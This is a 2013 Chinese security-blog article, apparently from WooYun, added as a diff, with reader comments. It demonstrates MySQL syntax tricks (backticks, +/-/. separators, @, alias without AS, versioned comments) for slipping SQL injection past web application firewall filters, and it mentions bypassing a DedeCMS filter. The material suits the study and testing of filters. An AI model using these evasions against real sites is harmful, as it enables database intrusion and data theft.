@@ -1,0 +1,59 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">waf 绕过的技巧</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">livers</a> <span class="bull">·</span> <time title="2013/05/31 17:41" ui-time="" datetime="2013/05/31 17:41" class="published ng-binding ng-isolate-scope">2013/05/31 17:41</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>研究过国内外的waf。分享一些 奇淫绝技。</p><p>一些大家都了解的技巧如：/&#42;!&#42;/,SELECT[0x09,0x0A-0x0D,0x20,0xA0]xx FROM 不再重造轮子。</p><p>Mysql</p><h2>tips1: 神奇的 `  (格式输出表的那个控制符)</h2><p>过空格和一些正则。</p><pre><code>mysql&gt; select`version`() 
+    -&gt; ;  
++----------------------+  
+| `version`()          |  
++----------------------+  
+| 5.1.50-community-log |  
++----------------------+  
+1 row in set (0.00 sec)
+</code></pre><p>一个更好玩的技巧，这个`控制符可以当注释符用（限定条件）。</p><pre><code>mysql&gt; select id from qs_admins where id=1;`dfff and comment it; 
++----+  
+| id |  
++----+  
+| 1  |  
++----+  
+1 row in set (0.00 sec)
+</code></pre><p>usage : where  id ='0'`'xxxxcomment on.</p><h2>tips2:神奇的- + .</h2><pre><code>mysql&gt; select id from qs_admins;  
++----+  
+| id | 
++----+  
+| 1  |  
++----+  
+1 row in set (0.00 sec)
+
+mysql&gt; select+id-1+1.from qs_admins;  
++----------+  
+| +id-1+1. |  
++----------+  
+| 1        |  
++----------+  
+1 row in set (0.00 sec)
+
+mysql&gt; select-id-1+3.from qs_admins;  
++----------+  
+| -id-1+3. |  
++----------+  
+| 1        |  
++----------+  
+1 row in set (0.00 sec)
+</code></pre><p>（有些人不是一直在说关键字怎么过？过滤一个from ...    就是这样连起来过）</p><h2>tips3: @</h2><pre><code>mysql&gt; select@^1.from qs_admins;  
++------|+  
+| @^1. |  
++------|+  
+| NULL |  
++------|+
+</code></pre><p>这个是bypass  曾经dedeCMS filter .</p><p>或者这样也是ok.</p><h2>tips4：mysql function() as xxx  也可以不用as 和空格</h2><pre><code>mysql&gt; select-count(id)test from qs_admins;  
++------|+  
+| test |  
++------|+  
+| -1   |  
++------|+  
+1 row in set (0.00 sec)
+</code></pre><h2>tips5:/&#42;![>5000]&#42;/ 新构造  版本号（这个可能有些过时了。）</h2><pre><code>mysql&gt; /\*!40000select\*/ id from qs_admins;  
++----+  
+| id |  
++----+  
+|  1 |  
++----+  
+1 row in set (0.00 sec)
+</code></pre><p>先分享这么多，哈。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/8166" rel="bookmark" id="re1">使用exp进行SQL报错注入</a></li><li><a href="http://drops.wooyun.org/tips/7299" rel="bookmark" id="re2">MySQL注入技巧</a></li><li><a href="http://drops.wooyun.org/tips/8614" rel="bookmark" id="re3">SQLMap的前世今生（Part1）</a></li><li><a href="http://drops.wooyun.org/tips/123" rel="bookmark" id="re4">MySql注入科普</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">情痴</span> <span class="reply-time">2015-12-13 21:24:38</span></div><p></p><p>谢谢分享，收藏了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">NeverEnd</span> <span class="reply-time">2015-10-13 13:51:25</span></div><p></p><p>Mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">枯荣</span> <span class="reply-time">2015-08-06 10:29:01</span></div><p></p><p>绕过啊绕过</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">axot</span> <span class="reply-time">2014-08-01 22:37:17</span></div><p></p><p>CTF中的一道题对sqlite_master进行了过滤. 该如何过呢? 大小写 十六进制试过了不行哦, substr()在from里用不了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-03-12 16:45:27</span></div><p></p><p>很赞呀</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">newbie0086</span> <span class="reply-time">2013-08-18 23:31:53</span></div><p></p><p>mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">applychen</span> <span class="reply-time">2013-06-05 13:35:06</span></div><p></p><p>真心不错~~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2013-06-01 11:41:48</span></div><p></p><p>一段可以用于防火墙安全测试的fuzz程序 http://zone.wooyun.org/content/1798 用这种方法可以找出好多诡异的不影响语法解析但是影响正则判断的字符</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2013-06-01 11:23:20</span></div><p></p><p>怪不得我心理测试都不正常。。哈哈</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Lenwood</span> <span class="reply-time">2013-06-01 10:35:00</span></div><p></p><p>能想出这些方法的人思维真心变态。</p><p></p></div></div></div></div></div></main>
